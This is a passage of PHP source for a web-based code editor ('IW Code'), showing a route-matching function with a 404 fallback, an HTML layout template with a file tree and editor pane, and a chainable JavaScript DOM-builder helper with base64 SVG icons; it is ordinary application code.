        $capable = array_map(function() use($pathurl){
            $arg = func_get_args();
            $data = $arg[0];
            $data['compability'] = 0;
            foreach($data['routepath'] as $kk => $root){
                if($pathurl[$kk] == $root){
                    $data['compability'] += 1;
                }
            }
            return $data['compability'];
        }, $pathofroot);
        
        
        $rr = [-1,-2];

        foreach($capable as $n){
            $rr[] = $n;
        }

        $capable = max(...$rr);

        
        $get = array_map(function() use($pathurl){
            $arg = func_get_args();
            $data = $arg[0];
            $data['compability'] = 0;
            foreach($data['routepath'] as $kk => $root){
                if($pathurl[$kk] == $root){
                    $data['compability'] += 1;
                }
            }
            return $data;
        }, $pathofroot);
        

        $getdata = array_map(function(){
            $arg = func_get_args();
            return $arg[0];
        },array_filter($get, function() use ($capable) {
            $arg = func_get_args();
            if($arg[0]['compability'] == $capable && $capable > 1){
                return $arg[0];
            }
        }));

        function serachParamTrueOrFalse(){
            $arg = func_get_args();
            function isparams(...$ssa){
                $res = false;
                foreach($ssa[1] as $s){
                    if($s['position'] == $ssa[0]){
                        $res = true;
                    }
                }
                return $res;
            }
            $result = true;
            foreach($arg[2] as $key => $prm){
                if(isparams($key, $arg[1]) != true){
                    if($arg[0][$key] != $prm){
                        $result = false;
                    };
                }
            }
            return $result;
        }

        if(count($getdata) > 0){
            foreach($getdata as $key => $calldata){
                $url = $calldata['url'];
                if(serachParamTrueOrFalse($calldata['routepath'], $calldata["params"], $pathurl) == true){
                    foreach($route as $numroute => $routes){
                        if($routes['url'] == $url){
                            (new self)->validating($numroute);
                            die();
                        }
                    }
                }else{
                    foreach($route as $y => $founderror){
                        if($founderror['url'] == PATH . '/404'){
                            (new self)->validating($y);
                            die();
                        }
                    }
                    echo "/404 <br>page not found";
                };
                die();
            };
        }else{
            foreach($route as $y => $founderror){
                if($founderror['url'] == PATH . '/404'){
                    (new self)->validating($y);
                    die();
                }
            }
            echo "/404 <br>page not found";
        }

    }
}

// template home html
try{
$GLOBALS[contentBody] = <<<EOT

    <!-- Main modal -->
    <div id="default-modal" tabindex="-1" aria-hidden="true" class="hidden overflow-y-auto overflow-x-hidden fixed top-0 right-0 left-0 z-50 justify-center items-center w-full md:inset-0 h-[calc(100%-1rem)] max-h-full">
        <div class="relative p-4 w-full max-w-2xl max-h-full">
            <!-- Modal content -->
            <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
                <!-- Modal header -->
                <div class="flex items-center justify-between p-2 md:p-2 border-b rounded-t dark:border-gray-600">
                    <h3 class="text-[12pt] font-semibold text-gray-900 dark:text-white" id="modal-title">Title Modal</h3>
                    <button type="button" class="text-gray-400 bg-transparent hover:bg-gray-200 hover:text-gray-900 rounded-lg text-sm w-8 h-8 ms-auto inline-flex justify-center items-center dark:hover:bg-gray-600 dark:hover:text-white" data-modal-hide="default-modal">
                        <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6"/>
                        </svg>
                        <span class="sr-only">Close modal</span>
                    </button>
                </div>
                <!-- Modal body -->
                <div class="p-4 md:p-5 space-y-4" id="modal-body">
                    
                </div>
                <!-- Modal footer -->
                <div class="flex items-center p-2 md:p-2 border-t border-gray-200 rounded-b dark:border-gray-600">
                    <button data-modal-hide="default-modal" type="button" style="display:none;" id="modal-close">I accept</button>
                   <div id="modal-footer">
                   </div>
                </div>
            </div>
        </div>
    </div>

    <div style="display:grid; grid-template-columns: 320px auto;background:#444;" class="h-full">
        <div style="overflow:autoload;background:rgba(0, 0, 0, 0.9) !important;">
            <div style="display:grid; grid-template-rows: 60px auto;">
                <div style="background:#444;display:flex; align-items:center; font-weight:bold; justify-content:center;">
                    <h1 class="text-white text-[14pt]"><> IW Code</h1>
                </div>
                <div style="height:calc(100vh - 60px);max-height:calc(100vh - 60px);min-height:calc(100vh - 60px); display:grid; grid-template-columns: 50px auto;">
                    <div style="background:#333;"></div>
                    <div height="100vh" style="max-height:calc(100vh - 60px);overflow:auto;" id="folder-show"></div>
                </div>
            </div>
        </div>
        <div style="display:grid; grid-template-rows: 60px auto;">
            <div>
                <button style="display:none;" id="modal-open" data-modal-target="default-modal" data-modal-toggle="default-modal" 
                class="
                    p-2 bg-slate-800 text-white m-2 rounded-md
                " type="button">
                  Open Project
                </button>
                <!-- button area -->
                
                
                <button class="
                    p-2 bg-slate-800 text-white m-2 rounded-md
                " data-action="open-project">
                    <img 
                        src="data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KCjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIFRyYW5zZm9ybWVkIGJ5OiBTVkcgUmVwbyBNaXhlciBUb29scyAtLT4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyMHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgo8ZyBpZD0iU1ZHUmVwb19iZ0NhcnJpZXIiIHN0cm9rZS13aWR0aD0iMCIvPgoKPGcgaWQ9IlNWR1JlcG9fdHJhY2VyQ2FycmllciIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+Cgo8ZyBpZD0iU1ZHUmVwb19pY29uQ2FycmllciI+IDxwYXRoIGQ9Ik0zIDguMkMzIDcuMDc5ODkgMyA2LjUxOTg0IDMuMjE3OTkgNi4wOTIwMkMzLjQwOTczIDUuNzE1NjkgMy43MTU2OSA1LjQwOTczIDQuMDkyMDIgNS4yMTc5OUM0LjUxOTg0IDUgNS4wNzk5IDUgNi4yIDVIOS42NzQ1MkMxMC4xNjM3IDUgMTAuNDA4MyA1IDEwLjYzODUgNS4wNTUyNkMxMC44NDI1IDUuMTA0MjUgMTEuMDM3NiA1LjE4NTA2IDExLjIxNjYgNS4yOTQ3MkMxMS40MTg0IDUuNDE4NCAxMS41OTE0IDUuNTkxMzUgMTEuOTM3MyA1LjkzNzI2TDEyLjA2MjcgNi4wNjI3NEMxMi40MDg2IDYuNDA4NjUgMTIuNTgxNiA2LjU4MTYgMTIuNzgzNCA2LjcwNTI4QzEyLjk2MjQgNi44MTQ5NCAxMy4xNTc1IDYuODk1NzUgMTMuMzYxNSA2Ljk0NDc0QzEzLjU5MTcgNyAxMy44MzYzIDcgMTQuMzI1NSA3SDE3LjhDMTguOTIwMSA3IDE5LjQ4MDIgNyAxOS45MDggNy4yMTc5OUMyMC4yODQzIDcuNDA5NzMgMjAuNTkwMyA3LjcxNTY5IDIwLjc4MiA4LjA5MjAyQzIxIDguNTE5ODQgMjEgOS4wNzk5IDIxIDEwLjJWMTUuOEMyMSAxNi45MjAxIDIxIDE3LjQ4MDIgMjAuNzgyIDE3LjkwOEMyMC41OTAzIDE4LjI4NDMgMjAuMjg0MyAxOC41OTAzIDE5LjkwOCAxOC43ODJDMTkuNDgwMiAxOSAxOC45MjAxIDE5IDE3LjggMTlINi4yQzUuMDc5ODkgMTkgNC41MTk4NCAxOSA0LjA5MjAyIDE4Ljc4MkMzLjcxNTY5IDE4LjU5MDMgMy40MDk3MyAxOC4yODQzIDMuMjE3OTkgMTcuOTA4QzMgMTcuNDgwMiAzIDE2LjkyMDEgMyAxNS44VjguMloiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4gPC9nPgoKPC9zdmc+"
                        style="display:inline-block;"
                    />
                    Open Project
                </button>
                
                <a href="/ace.php/logout" class="inline-block
                    p-2 bg-slate-800 text-white m-2 rounded-md float-right
                ">
                    <img 
                        src="data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KCjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIFRyYW5zZm9ybWVkIGJ5OiBTVkcgUmVwbyBNaXhlciBUb29scyAtLT4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyMHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgo8ZyBpZD0iU1ZHUmVwb19iZ0NhcnJpZXIiIHN0cm9rZS13aWR0aD0iMCIvPgoKPGcgaWQ9IlNWR1JlcG9fdHJhY2VyQ2FycmllciIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+Cgo8ZyBpZD0iU1ZHUmVwb19pY29uQ2FycmllciI+IDxwYXRoIGQ9Ik0zIDguMkMzIDcuMDc5ODkgMyA2LjUxOTg0IDMuMjE3OTkgNi4wOTIwMkMzLjQwOTczIDUuNzE1NjkgMy43MTU2OSA1LjQwOTczIDQuMDkyMDIgNS4yMTc5OUM0LjUxOTg0IDUgNS4wNzk5IDUgNi4yIDVIOS42NzQ1MkMxMC4xNjM3IDUgMTAuNDA4MyA1IDEwLjYzODUgNS4wNTUyNkMxMC44NDI1IDUuMTA0MjUgMTEuMDM3NiA1LjE4NTA2IDExLjIxNjYgNS4yOTQ3MkMxMS40MTg0IDUuNDE4NCAxMS41OTE0IDUuNTkxMzUgMTEuOTM3MyA1LjkzNzI2TDEyLjA2MjcgNi4wNjI3NEMxMi40MDg2IDYuNDA4NjUgMTIuNTgxNiA2LjU4MTYgMTIuNzgzNCA2LjcwNTI4QzEyLjk2MjQgNi44MTQ5NCAxMy4xNTc1IDYuODk1NzUgMTMuMzYxNSA2Ljk0NDc0QzEzLjU5MTcgNyAxMy44MzYzIDcgMTQuMzI1NSA3SDE3LjhDMTguOTIwMSA3IDE5LjQ4MDIgNyAxOS45MDggNy4yMTc5OUMyMC4yODQzIDcuNDA5NzMgMjAuNTkwMyA3LjcxNTY5IDIwLjc4MiA4LjA5MjAyQzIxIDguNTE5ODQgMjEgOS4wNzk5IDIxIDEwLjJWMTUuOEMyMSAxNi45MjAxIDIxIDE3LjQ4MDIgMjAuNzgyIDE3LjkwOEMyMC41OTAzIDE4LjI4NDMgMjAuMjg0MyAxOC41OTAzIDE5LjkwOCAxOC43ODJDMTkuNDgwMiAxOSAxOC45MjAxIDE5IDE3LjggMTlINi4yQzUuMDc5ODkgMTkgNC41MTk4NCAxOSA0LjA5MjAyIDE4Ljc4MkMzLjcxNTY5IDE4LjU5MDMgMy40MDk3MyAxOC4yODQzIDMuMjE3OTkgMTcuOTA4QzMgMTcuNDgwMiAzIDE2LjkyMDEgMyAxNS44VjguMloiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4gPC9nPgoKPC9zdmc+"
                        style="display:inline-block;"
                    />
                    logout
                </a>
                
                <!-- button area close -->
            </div>
            <div>
                <div style="height: 100%;" id="editor"></div>
            </div>
        </div>
    </div>
EOT;


} catch (\Throwable $e) {}

// module create element
try{
$GLOBALS['modulescript'] = <<<EOT
const el = function (el) {
    var obj = {}
    if (typeof el == 'object') {
        obj.el = el;
    } else {
        obj.el = document.createElement(el);
    }
    obj.ch = [];
    obj.id = function (a) {
        this.el.id = a;
        globalThis[a] = {
            parent: this.el,
            el: globalThis.el(this.el),
            child: function (a) {
                return this.parent.appendChild(a.get())
            }
        }
        return this;
    }
    obj.text = function (a) {
        this.el.className += ' disable-selection ';
        this.el.innerText = a;
        return this;
    }
    obj.addModule = function (name, func) {
        this.el[name] = func;
        return this;
    }
    obj.html = function (a) {
        this.el.innerHTML = a;
        return this;
    }
    obj.name = function (a) {
        this.el.setAttribute('name', a);
        return this;
    }
    obj.href = function (a) {
        this.el.setAttribute('href', a);
        return this;
    }
    obj.rel = function (a) {
        this.el.setAttribute('rel', a);
        return this;
    }
    obj.val = function (a) {
        this.el.value = a;
        return this;
    }
    obj.css = function (a, b) {
        if (typeof a == "object") {
            var ky = Object.keys(a);
            ky.forEach(function (item) {
                this.el.style[item] = a[item];
            }, this)
            return this;
        } else {
            this.el.style[a] = b;
            return this;
        }
    }
    obj.change = function (func) {
        this.el.addEventListener('change', func, false);
        return this;
    }
    obj.keydown = function (func) {
        this.el.addEventListener('keydown', func, false);
        return this;
    }
    obj.mouseover = function (func) {
        this.el.addEventListener('mouseover', func, false);
        return this;
    }
    obj.resize = function (func) {
        var gopy = this;
        window.addEventListener('resize', function (e) {
            width = e.target.outerWidth;
            height = e.target.outerHeight;
            var elm = {
                el: gopy.el,
                width: width,
                height: height
            }
            setTimeout(function () {
                func(elm);
            }, 100)
        }, gopy)
        return gopy;
    }
    obj.load = function (func) {
        var gopy = this;
        var width = window.outerWidth;
        var height = window.outerHeight;
        var elm = {
            el: gopy.el,
            width: width,
            height: height
        }
        setTimeout(function () {
            func(elm);
        }, 100)
        return gopy;
    }
    obj.mouseout = function (func) {
        this.el.addEventListener('mouseout', func, false);
        return this;
    }
    obj.keypress = function (func) {
        this.el.addEventListener('keypress', func, false);
        return this;
    }
    obj.click = function (func) {
        this.el.addEventListener('click', func, false);
        return this;
    }
    obj.submit = function (func) {
        this.el.addEventListener('submit', function (e) {
            el = e.path[0];

            el = new FormData(el);

            var object = {};
            el.forEach(function (value, key) {
                object[key] = value;
            });
            var json = object;

            func(json)

            e.preventDefault();
        }, false);
        return this;
    }
    obj.keyup = function (func) {
        this.el.addEventListener('keyup', func, false);
        return this;
    }
    obj.src = function (a) {
        this.el.setAttribute('src', a);
        return this;
    }
    obj.required = function (a) {
        this.el.setAttribute('required', '');
        return this;
    }
    obj.required = function (a) {
        this.el.setAttribute('required', '');
        return this;
    }
    obj.width = function (a) {
        this.el.style.width = a;
        return this;
    }
    obj.margin = function (a) {
        this.el.style.margin = a;
        return this;
    }
    obj.outline = function (a) {
        this.el.style.outline = a;
        return this;
    }
    obj.border = function (a) {
        this.el.style.border = a;
        return this;
    }
    obj.padding = function (a) {
        this.el.style.padding = a;
        return this;
    }
    obj.fixed = function () {
        this.el.style.position = "fixed";
        return this;
    }
    obj.radius = function (a) {
        this.el.style.borderRadius = a;
        return this;
    }
    obj.bottom = function (a) {
        this.el.style.bottom = a;
        return this;
    }
    obj.right = function (a) {
        this.el.style.right = a;
        return this;
    }
    obj.left = function (a) {
        this.el.style.left = a;
        return this;
    }
    obj.top = function (a) {
        this.el.style.top = a;
        return this;
    }
    obj.float = function (a) {
        this.el.style.float = a;
        return this;
    }
    obj.color = function (a) {
        this.el.style.color = a;
        return this;
    }
    obj.align = function (a) {
        this.el.style.textAlign = a;
        return this;
    }
    obj.size = function (a) {
        this.el.style.fontSize = a;
        return this;
    }
    obj.fontWeight = function (a) {
        if (a == undefined) {
            a = 'bold';
        }
        this.el.style.fontWeight = a;
        return this;
    }
    obj.background = function (a) {
        this.el.style.background = a;
        return this;
    }
    obj.padding = function (a) {
        this.el.style.padding = a;
        return this;
    }
    obj.marginTop = function (a) {
        this.el.style.marginTop = a;
        return this;
    }
    obj.marginBottom = function (a) {
        this.el.style.marginBottom = a;
        return this;
    }
    obj.marginLeft = function (a) {
        this.el.style.marginLeft = a;
        return this;
    }
    obj.marginRight = function (a) {
        this.el.style.marginRight = a;
        return this;
    }
    obj.backgroundImage = function (a) {
        this.el.style.backgroundImage = "url(" + a + ")";
        return this;
    }
    obj.font = function (a) {
        this.el.style.fontFamily = a;
        return this;
    }
    obj.backgroundSize = function (a) {
        this.el.style.backgroundSize = a;
        return this;
    }
    obj.backgroundRepeat = function (a) {
        this.el.style.backgroundRepeat = a;
        return this;
    }
    obj.backgroundPosition = function (a) {
        this.el.style.backgroundPosition = a;
        return this;
    }
    obj.cursor = function (a) {
        this.el.style.cursor = a;
        return this;
    }
    obj.display = function (a) {
        this.el.style.display = a;
        return this;
    }
    obj.height = function (a) {
        this.el.style.height = a;
        return this;
    }
    obj.placeholder = function (a) {
        this.el.setAttribute('placeholder', a);
        return this;
    }
    obj.hold = function (a) {
        this.el.setAttribute('placeholder', a);
        return this;
    }
    obj.design = function () {
        this.el.setAttribute('contenteditable', true);
        return this;
    }
    obj.class = function (a) {
        if (this.el.className != "") {
            this.el.className += ' ' + a + ' ';
        } else {
            this.el.className += a;
        }
        return this;
    }
    obj.type = function (a) {
        this.el.setAttribute("type", a);
        return this;
    }
    obj.attr = function (a, d) {
        this.el.setAttribute(a, d);
        return this;
    }
    obj.data = function (a, d) {
        this.el.setAttribute('data-' + a, d);
        return this;
    }
    obj.aria = function (a, d) {
        this.el.setAttribute('aria-' + a, d);
        return this;
    }
    obj.get = function () {
        if (this.ch.length != 0) {
            this.ch.forEach(function (item) {
                this.el.appendChild(item)
            }, this)
            return this.el;
        } else {
            return this.el;
        }
    }

    obj.child = function (a) {
        this.ch.push(a.get());
        return this;
    }

    obj.roboto = function () {
        this.el.style.fontFamily = 'Roboto';
        return this;
    }


    obj.getChild = function (pop) {
        return {
            parent: this.get().children[pop],
            el: globalThis.el(this.get().children[pop]),
            child: function (a) {
                return this.parent.appendChild(a.get())
            }
        }
    }

    obj.row = function (a) {
        var d = div()
            .class('row')

        a.forEach(function (elm) {
            d.child(
                div().class(elm['class']).child(elm['content'])
            )
        }, d);
        this.ch.push(d.get());
        return this;
    }
    return obj;
}
EOT;
} catch (\Throwable $e) {
    
}

// template script
try{
$GLOBALS["contentScript"] = <<<'EOT'
    let iconFolder = `data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KCjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIFRyYW5zZm9ybWVkIGJ5OiBTVkcgUmVwbyBNaXhlciBUb29scyAtLT4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyMHB4IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgo8ZyBpZD0iU1ZHUmVwb19iZ0NhcnJpZXIiIHN0cm9rZS13aWR0aD0iMCIvPgoKPGcgaWQ9IlNWR1JlcG9fdHJhY2VyQ2FycmllciIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIi8+Cgo8ZyBpZD0iU1ZHUmVwb19pY29uQ2FycmllciI+IDxwYXRoIGQ9Ik0zIDguMkMzIDcuMDc5ODkgMyA2LjUxOTg0IDMuMjE3OTkgNi4wOTIwMkMzLjQwOTczIDUuNzE1NjkgMy43MTU2OSA1LjQwOTczIDQuMDkyMDIgNS4yMTc5OUM0LjUxOTg0IDUgNS4wNzk5IDUgNi4yIDVIOS42NzQ1MkMxMC4xNjM3IDUgMTAuNDA4MyA1IDEwLjYzODUgNS4wNTUyNkMxMC44NDI1IDUuMTA0MjUgMTEuMDM3NiA1LjE4NTA2IDExLjIxNjYgNS4yOTQ3MkMxMS40MTg0IDUuNDE4NCAxMS41OTE0IDUuNTkxMzUgMTEuOTM3MyA1LjkzNzI2TDEyLjA2MjcgNi4wNjI3NEMxMi40MDg2IDYuNDA4NjUgMTIuNTgxNiA2LjU4MTYgMTIuNzgzNCA2LjcwNTI4QzEyLjk2MjQgNi44MTQ5NCAxMy4xNTc1IDYuODk1NzUgMTMuMzYxNSA2Ljk0NDc0QzEzLjU5MTcgNyAxMy44MzYzIDcgMTQuMzI1NSA3SDE3LjhDMTguOTIwMSA3IDE5LjQ4MDIgNyAxOS45MDggNy4yMTc5OUMyMC4yODQzIDcuNDA5NzMgMjAuNTkwMyA3LjcxNTY5IDIwLjc4MiA4LjA5MjAyQzIxIDguNTE5ODQgMjEgOS4wNzk5IDIxIDEwLjJWMTUuOEMyMSAxNi45MjAxIDIxIDE3LjQ4MDIgMjAuNzgyIDE3LjkwOEMyMC41OTAzIDE4LjI4NDMgMjAuMjg0MyAxOC41OTAzIDE5LjkwOCAxOC43ODJDMTkuNDgwMiAxOSAxOC45MjAxIDE5IDE3LjggMTlINi4yQzUuMDc5ODkgMTkgNC41MTk4NCAxOSA0LjA5MjAyIDE4Ljc4MkMzLjcxNTY5IDE4LjU5MDMgMy40MDk3MyAxOC4yODQzIDMuMjE3OTkgMTcuOTA4QzMgMTcuNDgwMiAzIDE2LjkyMDEgMyAxNS44VjguMloiIHN0cm9rZT0iI2ZmZmZmZiIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiLz4gPC9nPgoKPC9zdmc+`;
    let iconFile = `data:image/svg+xml;base64,PCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KCjwhLS0gVXBsb2FkZWQgdG86IFNWRyBSZXBvLCB3d3cuc3ZncmVwby5jb20sIFRyYW5zZm9ybWVkIGJ5OiBTVkcgUmVwbyBNaXhlciBUb29scyAtLT4KPHN2ZyB3aWR0aD0iMjBweCIgaGVpZ2h0PSIyMHB4IiB2aWV3Qm94PSIwIDAgMjQuMDAgMjQuMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmIj4KCjxnIGlkPSJTVkdSZXBvX2JnQ2FycmllciIgc3Ryb2tlLXdpZHRoPSIwIi8+Cgo8ZyBpZD0iU1ZHUmVwb190cmFjZXJDYXJyaWVyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIHN0cm9rZT0iI0NDQ0NDQyIgc3Ryb2tlLXdpZHRoPSIwLjA0OCIvPgoKPGcgaWQ9IlNWR1JlcG9faWNvbkNhcnJpZXIiPiA8cGF0aCBkPSJNMTMgM0wxMy43MDcxIDIuMjkyODlDMTMuNTE5NiAyLjEwNTM2IDEzLjI2NTIgMiAxMyAyVjNaTTE5IDlIMjBDMjAgOC43MzQ3OCAxOS44OTQ2IDguNDgwNDMgMTkuNzA3MSA4LjI5Mjg5TDE5IDlaTTEzLjEwOSA4LjQ1Mzk5TDE0IDhWOEwxMy4xMDkgOC40NTM5OVpNMTMuNTQ2IDguODkxMDFMMTQgOEwxMy41NDYgOC44OTEwMVpNMTAgMTNDMTAgMTIuNDQ3NyA5LjU1MjI4IDEyIDkgMTJDOC40NDc3MiAxMiA4IDEyLjQ0NzcgOCAxM0gxMFpNOCAxNkM4IDE2LjU1MjMgOC40NDc3MiAxNyA5IDE3QzkuNTUyMjggMTcgMTAgMTYuNTUyMyAxMCAxNkg4Wk04LjUgOUM3Ljk0NzcyIDkgNy41IDkuNDQ3NzIgNy41IDEwQzcuNSAxMC41NTIzIDcuOTQ3NzIgMTEgOC41IDExVjlaTTkuNSAxMUMxMC4wNTIzIDExIDEwLjUgMTAuNTUyMyAxMC41IDEwQzEwLjUgOS40NDc3MiAxMC4wNTIzIDkgOS41IDlWMTFaTTguNSA2QzcuOTQ3NzIgNiA3LjUgNi40NDc3MiA3LjUgN0M3LjUgNy41NTIyOCA3Ljk0NzcyIDggOC41IDhWNlpNOS41IDhDMTAuMDUyMyA4IDEwLjUgNy41NTIyOCAxMC41IDdDMTAuNSA2LjQ0NzcyIDEwLjA1MjMgNiA5LjUgNlY4Wk0xNy45MDggMjAuNzgyTDE3LjQ1NCAxOS44OTFMMTcuNDU0IDE5Ljg5MUwxNy45MDggMjAuNzgyWk0xOC43ODIgMTkuOTA4TDE5LjY3MyAyMC4zNjJMMTguNzgyIDE5LjkwOFpNNS4yMTc5OSAxOS45MDhMNC4zMjY5OCAyMC4zNjJINC4zMjY5OEw1LjIxNzk5IDE5LjkwOFpNNi4wOTIwMiAyMC43ODJMNi41NDYwMSAxOS44OTFMNi41NDYwMSAxOS44OTFMNi4wOTIwMiAyMC43ODJaTTYuMDkyMDIgMy4yMTc5OUw1LjYzODAzIDIuMzI2OThMNS42MzgwMyAyLjMyNjk4TDYuMDkyMDIgMy4yMTc5OVpNNS4yMTc5OSA0LjA5MjAyTDQuMzI2OTggMy42MzgwM0w0LjMyNjk4IDMuNjM4MDNMNS4yMTc5OSA0LjA5MjAyWk0xMiAzVjcuNEgxNFYzSDEyWk0xNC42IDEwSDE5VjhIMTQuNlYxMFpNMTIgNy40QzEyIDcuNjYzNTMgMTEuOTk5MiA3LjkyMTMxIDEyLjAxNjkgOC4xMzgyM0MxMi4wMzU2IDguMzY2ODIgMTIuMDc5NyA4LjYzNjU2IDEyLjIxOCA4LjkwNzk4TDE0IDhDMTQuMDI5MyA4LjA1NzUxIDE0LjAxODkgOC4wODAyOCAxNC4wMTAzIDcuOTc1MzdDMTQuMDAwOCA3Ljg1ODc4IDE0IDcuNjk2NTMgMTQgNy40SDEyWk0xNC42IDhDMTQuMzAzNSA4IDE0LjE0MTIgNy45OTkyMiAxNC4wMjQ2IDcuOTg5N0MxMy45MTk3IDcuOTgxMTMgMTMuOTQyNSA3Ljk3MDcgMTQgOEwxMy4wOTIgOS43ODIwMUMxMy4zNjM0IDkuOTIwMzEgMTMuNjMzMiA5Ljk2NDM4IDEzLjg2MTggOS45ODMwNUMxNC4wNzg3IDEwLjAwMDggMTQuMzM2NSAxMCAxNC42IDEwVjhaTTEyLjIxOCA4LjkwNzk4QzEyLjQwOTcgOS4yODQzIDEyLjcxNTcgOS41OTAyNyAxMy4wOTIgOS43ODIwMUwxNCA4VjhMMTIuMjE4IDguOTA3OThaTTggMTNWMTZIMTBWMTNIOFpNOC41IDExSDkuNVY5SDguNVYxMVpNOC41IDhIOS41VjZIOC41VjhaTTEzIDJIOC4yVjRIMTNWMlpNNCA2LjJWMTcuOEg2VjYuMkg0Wk04LjIgMjJIMTUuOFYyMEg4LjJWMjJaTTIwIDE3LjhWOUgxOFYxNy44SDIwWk0xOS43MDcxIDguMjkyODlMMTMuNzA3MSAyLjI5Mjg5TDEyLjI5MjkgMy43MDcxMUwxOC4yOTI5IDkuNzA3MTFMMTkuNzA3MSA4LjI5Mjg5Wk0xNS44IDIyQzE2LjM0MzYgMjIgMTYuODExNCAyMi4wMDA4IDE3LjE5NSAyMS45Njk0QzE3LjU5MDQgMjEuOTM3MSAxNy45ODM2IDIxLjg2NTggMTguMzYyIDIxLjY3M0wxNy40NTQgMTkuODkxQzE3LjQwNDUgMTkuOTE2MiAxNy4zMDM4IDE5Ljk1MzkgMTcuMDMyMiAxOS45NzYxQzE2Ljc0ODggMTkuOTk5MiAxNi4zNzY2IDIwIDE1LjggMjBWMjJaTTE4IDE3LjhDMTggMTguMzc2NiAxNy45OTkyIDE4Ljc0ODggMTcuOTc2MSAxOS4wMzIyQzE3Ljk1MzkgMTkuMzAzOCAxNy45MTYyIDE5LjQwNDUgMTcuODkxIDE5LjQ1NEwxOS42NzMgMjAuMzYyQzE5Ljg2NTggMTkuOTgzNiAxOS45MzcxIDE5LjU5MDQgMTkuOTY5NCAxOS4xOTVDMjAuMDAwOCAxOC44MTE0IDIwIDE4LjM0MzYgMjAgMTcuOEgxOFpNMTguMzYyIDIxLjY3M0MxOC45MjY1IDIxLjM4NTQgMTkuMzg1NCAyMC45MjY1IDE5LjY3MyAyMC4zNjJMMTcuODkxIDE5LjQ1NEMxNy43OTUxIDE5LjY0MjIgMTcuNjQyMiAxOS43OTUxIDE3LjQ1NCAxOS44OTFMMTguMzYyIDIxLjY3M1pNNCAxNy44QzQgMTguMzQzNiAzLjk5OTIyIDE4LjgxMTQgNC4wMzA1NyAxOS4xOTVDNC4wNjI4NyAxOS41OTA0IDQuMTM0MTkgMTkuOTgzNiA0LjMyNjk4IDIwLjM2Mkw2LjEwODk5IDE5LjQ1NEM2LjA4MzggMTkuNDA0NSA2LjA0NjEyIDE5LjMwMzggNi4wMjM5MyAxOS4wMzIyQzYuMDAwNzggMTguNzQ4OCA2IDE4LjM3NjYgNiAxNy44SDRaTTguMiAyMEM3LjYyMzQ1IDIwIDcuMjUxMTcgMTkuOTk5MiA2Ljk2Nzg0IDE5Ljk3NjFDNi42OTYxNyAxOS45NTM5IDYuNTk1NDUgMTkuOTE2MiA2LjU0NjAxIDE5Ljg5MUw1LjYzODAzIDIxLjY3M0M2LjAxNjQxIDIxLjg2NTggNi40MDk2MyAyMS45MzcxIDYuODA0OTcgMjEuOTY5NEM3LjE4ODY0IDIyLjAwMDggNy42NTY0NSAyMiA4LjIgMjJWMjBaTTQuMzI2OTggMjAuMzYyQzQuNjE0NiAyMC45MjY1IDUuMDczNTQgMjEuMzg1NCA1LjYzODAzIDIxLjY3M0w2LjU0NjAxIDE5Ljg5MUM2LjM1Nzg1IDE5Ljc5NTEgNi4yMDQ4NyAxOS42NDIyIDYuMTA4OTkgMTkuND